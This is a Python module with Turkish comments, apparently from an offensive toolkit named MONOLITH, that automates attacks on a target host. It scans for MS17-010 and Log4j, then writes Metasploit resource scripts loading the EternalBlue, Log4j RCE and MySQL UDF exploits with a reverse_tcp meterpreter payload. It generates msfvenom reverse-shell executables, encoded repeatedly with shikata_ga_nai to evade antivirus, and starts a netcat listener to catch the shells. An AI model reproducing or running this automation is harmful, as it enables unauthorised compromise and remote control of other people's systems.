import os
import shutil
import subprocess
import datetime
import sqlite3
import random
import secrets


class NucleiTemplateUpdater:
    """Nuclei template'lerini otomatik güncelleyen modül"""
    def __init__(self):
        self.nuclei_path = shutil.which("nuclei")
        self.update_interval = 24 * 60 * 60
        self.last_update = None

    def update_templates(self, force=False):
        if not self.nuclei_path:
            print("[!] Nuclei bulunamadı, template güncellenemiyor.")
            return False
        try:
            print("\n[*] Nuclei template'leri güncelleniyor...")
            cmd = [self.nuclei_path, "-update-templates", "/tmp/nuclei-templates"]
            if force:
                cmd.append("--force")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            if result.returncode == 0:
                print("[✓] Nuclei template'leri başarıyla güncellendi!")
                self.last_update = datetime.datetime.now()
                return True
            else:
                print(f"[!] Template güncelleme hatası: {result.stderr}")
                return False
        except subprocess.TimeoutExpired:
            print("[!] Template güncelleme zaman aşımı (5 dakika)")
            return False
        except Exception as e:
            print(f"[!] Template güncelleme hatası: {str(e)}")
            return False


class EnhancedAutoExploit:
    """Geliştirilmiş AutoExploit - Metasploit entegrasyonu ve reverse shell listener"""
    def __init__(self, scan_id, target, db_name=None, lhost=None):
        self.scan_id = scan_id
        self.target = target
        self.metasploit_rc = f"/tmp/monolith_msf_{scan_id}.rc"
        self.listener_port = random.randint(4444, 9999)
        self.listener_process = None
        self.sessions = []
        self.msf_path = shutil.which("msfconsole")
        self.msfvenom_path = shutil.which("msfvenom")
        self.nc_path = shutil.which("nc")
        self.nuclei_path = shutil.which("nuclei")
        self.db_name = db_name
        self.lhost = lhost

    def log_exploit(self, message, level="INFO"):
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] [EnhancedAutoExploit/{level}] {message}")
        try:
            if self.db_name:
                with sqlite3.connect(self.db_name) as conn:
                    conn.execute("""
                        INSERT INTO tool_logs (scan_id, tool_name, output)
                        VALUES (?, ?, ?)
                    """, (self.scan_id, "ENHANCED_EXPLOIT", f"[{level}] {message}"))
        except Exception:
            pass

    def create_metasploit_rc(self, exploit_type="generic"):
        lhost = self.lhost or '127.0.0.1'
        lport = self.listener_port
        rc_content = f"""
# MONOLITH Enhanced AutoExploit Resource Script
# Scan ID: {self.scan_id}
# Target: {self.target}
# Generated: {datetime.datetime.now().isoformat()}

workspace -a monolith_scan_{self.scan_id}

setg RHOSTS {self.target}
setg RPORT 443
setg SSL true
setg VERBOSE true

# Payload ayarları
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
set LURI /session/{self.scan_id}

# Exploit modülleri
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Otomatik session yönetimi
set SessionTtl 3600
set AutoRunScript "migrate -f"

# Logging
set LogFile /tmp/msf_{self.scan_id}.log

# Auto-exploit
setg DisablePayloadHandler false

# Payload çeşitliliği
{"use exploit/windows/smb/ms17_010_eternalblue" if exploit_type == "smb" else ""}
{"use exploit/multi/http/apache_log4j_rce" if exploit_type == "log4j" else ""}
{"use exploit/multi/mysql/mysql_udf_payload" if exploit_type == "mysql" else ""}

# Resource script çalıştır
run
"""
        try:
            with open(self.metasploit_rc, 'w') as f:
                f.write(rc_content)
            self.log_exploit(f"Metasploit RC script oluşturuldu: {self.metasploit_rc}")
            return True
        except Exception as e:
            self.log_exploit(f"RC script oluşturma hatası: {str(e)}", "ERROR")
            return False

    def start_reverse_shell_listener(self):
        if not self.nc_path:
            self.log_exploit("Netcat bulunamadı, listener başlatılamıyor", "WARNING")
            return False
        try:
            listener_cmd = [self.nc_path, "-lvnp", str(self.listener_port)]
            self.listener_process = subprocess.Popen(listener_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.log_exploit(f"Reverse shell listener başlatıldı: {self.lhost}:{self.listener_port}")
            return True
        except Exception as e:
            self.log_exploit(f"Listener başlatma hatası: {str(e)}", "ERROR")
            return False

    def generate_payload(self, payload_type="reverse_shell"):
        if not self.msfvenom_path:
            self.log_exploit("Msfvenom bulunamadı", "ERROR")
            return None
        try:
            output_file = f"/tmp/payload_{self.scan_id}.exe"
            if payload_type == "reverse_shell":
                payload = "windows/x64/shell_reverse_tcp"
            elif payload_type == "meterpreter":
                payload = "windows/x64/meterpreter/reverse_tcp"
            elif payload_type == "linux":
                payload = "linux/x64/shell_reverse_tcp"
            else:
                payload = "generic/shell_reverse_tcp"
            cmd = [self.msfvenom_path, "-p", payload, f"LHOST={self.lhost}", f"LPORT={self.listener_port}"]
            if payload.startswith('windows'):
                cmd.extend(["-a", "x64", "--platform", "windows"])
                out_format = "exe"
            elif payload.startswith('linux'):
                cmd.extend(["-a", "x64", "--platform", "linux"])
                out_format = "elf"
            else:
                out_format = "raw"
            cmd.extend(["-f", out_format, "-o", output_file, "-e", "x86/shikata_ga_nai", "-i", "5"])
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            if result.returncode == 0 and os.path.exists(output_file):
                self.log_exploit(f"Payload oluşturuldu: {output_file}")
                return output_file
            else:
                self.log_exploit(f"Payload oluşturma hatası: {result.stderr}", "ERROR")
                return None
        except Exception as e:
            self.log_exploit(f"Payload oluşturma hatası: {str(e)}", "ERROR")
            return None

    def run_metasploit(self):
        if not self.msf_path:
            self.log_exploit("Metasploit bulunamadı", "ERROR")
            return False
        try:
            self.start_reverse_shell_listener()
            cmd = [self.msf_path, "-r", self.metasploit_rc, "-q"]
            self.log_exploit("Metasploit başlatılıyor...")
            process = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            if process.returncode == 0:
                self.log_exploit("Metasploit oturumu başarıyla çalıştırıldı", "SUCCESS")
                return True
            else:
                self.log_exploit(f"Metasploit hatası: {process.stderr}", "ERROR")
                return False
        except subprocess.TimeoutExpired:
            self.log_exploit("Metasploit zaman aşımı (5 dakika)", "WARNING")
            return True
        except Exception as e:
            self.log_exploit(f"Metasploit çalıştırma hatası: {str(e)}", "ERROR")
            return False

    def check_common_vulnerabilities(self):
        vulnerabilities = []
        try:
            cmd = [self.nuclei_path or "nuclei", "-id", "smb-vuln-ms17-010", "-u", self.target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            if "critical" in result.stdout.lower() or "high" in result.stdout.lower():
                vulnerabilities.append(("smb", "MS17-010 Eternalblue"))
        except:
            pass
        try:
            cmd = [self.nuclei_path or "nuclei", "-id", "cve-2021-44228", "-u", self.target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            if "critical" in result.stdout.lower():
                vulnerabilities.append(("log4j", "Log4j CVE-2021-44228"))
        except:
            pass
        return vulnerabilities

    def start(self):
        self.log_exploit(f"Enhanced AutoExploit başlatıldı: {self.target}", "INFO")
        try:
            vulnerabilities = self.check_common_vulnerabilities()
            if vulnerabilities:
                for vuln_type, vuln_name in vulnerabilities:
                    self.log_exploit(f"Zafiyet bulundu: {vuln_name}", "WARNING")
                    self.create_metasploit_rc(vuln_type)
                    self.run_metasploit()
            else:
                self.log_exploit("Genel payload oluşturuluyor...", "INFO")
                self.create_metasploit_rc("generic")
                payload_file = self.generate_payload("meterpreter")
                if payload_file:
                    self.log_exploit(f"Payload hazır: {payload_file}", "SUCCESS")
                self.run_metasploit()
            if self.db_name:
                with sqlite3.connect(self.db_name) as conn:
                    conn.execute("""
                        INSERT INTO vulns (scan_id, type, url, severity)
                        VALUES (?, ?, ?, ?)
                    """, (self.scan_id, "AUTOEXPLOIT_ATTEMPT", self.target, "HIGH"))
            self.cleanup()
            self.log_exploit("Enhanced AutoExploit tamamlandı", "SUCCESS")
        except Exception as e:
            self.log_exploit(f"AutoExploit hatası: {str(e)}", "ERROR")
            self.cleanup()

    def cleanup(self):
        try:
            if self.listener_process:
                self.listener_process.terminate()
                self.listener_process.wait(timeout=5)
            if os.path.exists(self.metasploit_rc):
                os.remove(self.metasploit_rc)
        except Exception as e:
            self.log_exploit(f"Temizlik hatası: {str(e)}", "WARNING")
